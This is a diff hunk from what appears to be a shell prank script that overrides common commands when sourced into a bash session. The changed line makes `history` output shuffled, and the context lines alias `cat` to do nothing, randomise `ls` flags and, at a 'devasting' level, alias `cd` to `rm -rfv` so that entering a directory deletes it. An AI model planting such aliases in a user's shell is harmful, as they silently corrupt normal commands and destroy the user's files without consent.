@@ -59,7 +59,7 @@ annoying && alias cat=true;
 annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
 # Use a random sort option whenever `history` is invoked.
-annoying && function history { command history -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
+insane && alias history='history | shuf'
 
 # Delete directories instead of entering them.
 devasting && alias cd='rm -rfv';
